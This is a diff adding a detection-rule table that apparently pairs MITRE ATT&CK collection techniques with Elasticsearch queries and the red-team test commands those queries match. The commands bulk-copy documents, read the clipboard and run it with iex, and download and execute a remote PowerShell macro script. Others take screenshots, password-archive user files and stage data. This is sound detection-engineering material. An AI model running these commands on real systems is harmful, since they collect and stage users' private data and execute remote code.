@@ -1,0 +1,391 @@
+T1119,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match"":{""CommandLine"": ""findstr""}},
+                            {""match"":{""CommandLine"": ""for""}},
+                            {""match"":{""CommandLine"": ""in""}},
+                            {""match_phrase"":{""CommandLine"": ""do copy""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","mkdir %temp%\T1119_command_prompt_collection >nul 2>&1 
+&& dir c: /b /s .docx | findstr /e .docx 
+&& for /R c: %f in (*.docx) do copy %f %temp%\T1119_command_prompt_collection",2(4)
+T1119,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""Get-ChildItem""}},
+                            {""match_phrase"":{""CommandLine"": ""-include *.*""}},
+                            {""match_phrase"":{""CommandLine"": ""Copy-Item""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null; 
+Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}",2(4)
+T1119,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                           {""match_phrase"":{""CommandLine"": ""sc query type=service""}},
+                        {""match_phrase"": {""CommandLine"": ""doskey /history""}},
+                        {""match_phrase"": {""CommandLine"": ""wmic process list""}},
+                        {""match"": {""CommandLine"": ""tree""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","sc query type=service > %TEMP%\T1119_1.txt 
+&& doskey /history > %TEMP%\T1119_2.txt 
+&& wmic process list > %TEMP%\T1119_3.txt 
+&& tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt",
+T1119,"{
+    ""query"": {
+            ""bool"":{
+                  ""must"":[
+                        
+                        {""match_phrase"":{""CommandLine"": ""Get-Service &gt;""}},
+                        {""match_phrase"":{""CommandLine"": ""Get-ChildItem Env: &gt;""}},
+                        {""match_phrase"":{""CommandLine"": ""Get-Process &gt;""}}
+      ]
+     }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","
+
+Get-Service > $env:TEMP\T1119_1.txt; 
+Get-ChildItem Env: > $env:TEMP\T1119_2.txt; 
+Get-Process > $env:TEMP\T1119_3.txt",2
+T1115,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                       {""match"": {""CommandLine"": ""Clip""}},
+                       {""match"": {""CommandLine"": ""dir""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","dir | clip && echo ""T1115"" > %temp%\T1115.txt && clip < %temp%\T1115.txt",2
+T1115,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [               
+                            {""match_phrase"":{""CommandLine"": ""Get-Clipboard""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","echo Get-Process | clip; 
+Get-Clipboard | iex
+
+Get-Clipboard -raw",2
+T1115,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                    {""match_phrase"":{""CommandLine"": ""Invoke-Maldoc""}},
+                    {""match"": {""CommandLine"": ""GetClipboard""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+Set-Clipboard -value ""Atomic T1115 Test, grab data from clipboard via VBA""; 
+IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); 
+Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1115\src\T1115-macrocode.txt"" -officeProduct ""Word"" -sub ""GetClipboard""",1
+T1560,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""wildcard"":{""CommandLine"": ""dir*""}},
+                            {""match_phrase"":{""CommandLine"": ""Compress-Archive -DestinationPath""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}
+",dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\T1560-data-ps.zip,2(4)
+T1560.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [                         
+                            {""match_phrase"":{""CommandLine"": ""Compress-Archive -Path""}},
+                            {""match"":{""CommandLine"": ""-DestinationPath""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Compress-Archive -Path PathToAtomicsFolder\T1074.001\bin\Folder_to_zip -DestinationPath $env:TEMP\Folder_to_zip.zip -Force
+
+Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;
+sleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select",2
+T1560.001,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                            {""match_phrase"":{""CommandLine"": ""7-zip\\7z.exe""}},
+                            {""match_phrase"":{""CommandLine"": ""WinRAR/Rar.exe""}},
+                            {""match_phrase"":{""CommandLine"": ""WinZip\\winzip64.exe""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","if not exist ""%ProgramFiles%\7-zip\7z.exe""  ( call ) ELSE ( echo Downloading 7-zip installer 
+&& bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.7-zip.org/a/7z2002-x64.exe"" %TEMP%\7zip.exe 
+&& %TEMP%\7zip.exe /S ) &&   
+&&  mkdir $PathToAtomicsFolder\T1560.001\victim-files 
+&& cd $PathToAtomicsFolder\T1560.001\victim-files 
+&& echo ""This file will be encrypted"" > .\encrypted_file.txt && ""%ProgramFiles%\7-zip\7z.exe"" u archive.7z *txt -pblue 
+&& dir
+
+if not exist ""%programfiles%/WinRAR/Rar.exe""  ( call ) ELSE ( echo Downloading Winrar installer 
+&& bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"" %TEMP%\winrar.exe 
+&& %TEMP%\winrar.exe /S ) &&   
+&&  mkdir .\tmp\victim-files 
+&& cd .\tmp\victim-files 
+&& echo ""This file will be encrypted"" > .\encrypted_file.txt 
+&& ""%programfiles%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar && dir
+
+path=%path%;""C:\Program Files (x86)\winzip"" 
+&& mkdir .\tmp\victim-files 
+&& cd .\tmp\victim-files 
+&& echo ""This file will be encrypted"" > .\encrypted_file.txt 
+&& ""%ProgramFiles%\WinZip\winzip64.exe"" -min -a -s""hello"" archive.zip * 
+&& dir
+
+if not exist ""%programfiles%/WinRAR/Rar.exe""  ( call ) ELSE ( echo Downloading Winrar installer 
+&& bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"" %TEMP%\winrar.exe 
+&& %TEMP%\winrar.exe /S ) &&   
+&&  ""%programfiles%/WinRAR/Rar.exe"" a -r %USERPROFILE%\T1560.001-data.rar %USERPROFILE%\*.txt",1
+T1005,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""Get-ChildItem""}},                 
+                            {""match"":{""CommandLine"": ""-Include""}},
+                            {""wildcard"":{""CommandLine"": ""foreach*""}},
+                            {""match_phrase"":{""CommandLine"": ""Select-Object""}}                         
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Get-ChildItem C:\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;
+exit 0;",2
+T1059.001,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                        {""match_phrase"": {""CommandLine"": ""Get-WmiObject""}},
+                        {""match_phrase"": {""CommandLine"": ""win32_operatingsystem""}},
+                        {""match_phrase"": {""CommandLine"": ""select -property *""}}
+      ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","powershell.exe -c ""Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log"";",2
+T1123,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [                         
+                            {""match_phrase"":{""CommandLine"": ""WindowsAudioDevice-Powershell-Cmdlet""}},
+                            {""wildcard"":{""CommandLine"": ""*AudioDeviceCmdlets""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet,2
+T1123,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"":{""CommandLine"": ""reg add""}},
+                        {""match_phrase"":{""CommandLine"": ""CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged""}}
+       ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""wildcard"": {""CommandLine"": ""LastUsedTimeStop*""}},
+                        {""wildcard"": {""CommandLine"": ""LastUsedTimeStart*""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f 
+&& reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",2
+T1125,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                       {""match_phrase"":{""CommandLine"": ""reg add""}},
+                       {""match_phrase"":{""CommandLine"": ""CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged""}}
+           ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""wildcard"": {""CommandLine"": ""LastUsedTimeStop*""}},
+                        {""wildcard"": {""CommandLine"": ""LastUsedTimeStart*""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f 
+&& reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",2
+T1113,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"":{""CommandLine"": ""System.Drawing""}},
+                        {""match_phrase"":{""CommandLine"": ""New-Object Drawing.Bitmap""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""wildcard"": {""CommandLine"": ""*.CopyFromScreen""}},
+                        {""wildcard"": {""CommandLine"": ""*.Save(""}},
+                        {""wildcard"": {""CommandLine"": ""*.Dispose()""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$loadResult = [Reflection.Assembly]::LoadWithPartialName(""System.Drawing"");
+function screenshot([Drawing.Rectangle]$bounds, $path) {
+   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;
+   $graphics = [Drawing.Graphics]::FromImage($bmp);
+   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
+   $bmp.Save($path);
+   $graphics.Dispose();
+   $bmp.Dispose();
+}
+if ($loadResult) {
+  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);
+  $dest = ""$HOME\Desktop\screenshot.png"";
+  screenshot $bounds $dest;
+  if (Test-Path -Path $dest) {
+    $dest;
+    exit 0;
+  };
+};
+exit 1;",2
+T1113,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""Add-Type -AssemblyName System.Windows.Forms""}},
+                        {""match_phrase"": {""CommandLine"": ""New-Object Drawing.Bitmap""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""[Windows.Forms.SystemInformation]::VirtualScreen""}},
+                        {""match_phrase"": {""CommandLine"": ""[Drawing.Graphics]::FromImage""}},
+                        {""wildcard"": {""CommandLine"": ""*.CopyFromScreen(""}},
+                        {""wildcard"": {""CommandLine"": ""*.Save(""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Add-Type -AssemblyName System.Windows.Forms; 
+$screen = [Windows.Forms.SystemInformation]::VirtualScreen; 
+$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height; 
+$graphic = [Drawing.Graphics]::FromImage($bitmap); 
+$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size); 
+$bitmap.Save(""$env:TEMP\T1113.png"")",2(4)
+T1113,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                        {""match_phrase"": {""CommandLine"": ""psr.exe /start""}},
+                        {""match_phrase"": {""CommandLine"": ""psr.exe /stop""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}
+","cmd /c start /b psr.exe /start /output c:\temp\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12; 
+Add-Type -MemberDefinition '[DllImport(""user32.dll"")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W; 
+[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0); 
+cmd /c ""timeout 5 > NULL && psr.exe /stop""",2
+T1074.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""New-Item""}},
+                            {""match"":{""CommandLine"": ""-ItemType""}},
+                            {""match"":{""CommandLine"": ""directory""}},
+                            {""wildcard"":{""CommandLine"": ""foreach*""}},
+                            {""match_phrase"":{""CommandLine"": ""Select-Object""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}
+","New-Item -Path ""."" -Name ""staged"" -ItemType ""directory"" -Force | foreach {$_.FullName} | Select-Object",2
+T1074.001,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must_not"":[
+                        {""match_phrase"": {""CommandLine"": ""Get-Service""}},
+                        {""match_phrase"": {""CommandLine"": ""Start-Job""}},
+                        {""match_phrase"": {""CommandLine"": ""New-Object""}},
+                        {""match"": {""CommandLine"": ""net""}},
+                        {""match"": {""CommandLine"": ""takeown""}},
+                        {""match"": {""CommandLine"": ""mklink""}},
+                        {""match"": {""CommandLine"": ""icacls""}},
+                        {""match_phrase"": {""CommandLine"": ""sc create""}},
+                        {""match_phrase"": {""CommandLine"": ""Set-ItemProperty""}},
+                        {""match_phrase"": {""CommandLine"": ""Start-Process""}},
+                        {""wildcard"": {""CommandLine"": ""reg*""}},
+                        {""wildcard"": {""CommandLine"": ""cscript*""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"":{""CommandLine"": ""Copy-Item""}},
+                        {""match_phrase"":{""CommandLine"": ""copy""}}
+      ]
+     }
+    },
+    {""bool"":{
+     ""must"":[
+                        {""match"":{""CommandLine"": ""staged""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}
+
+copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}",2(Îó±¨ÂÊ¸ß)
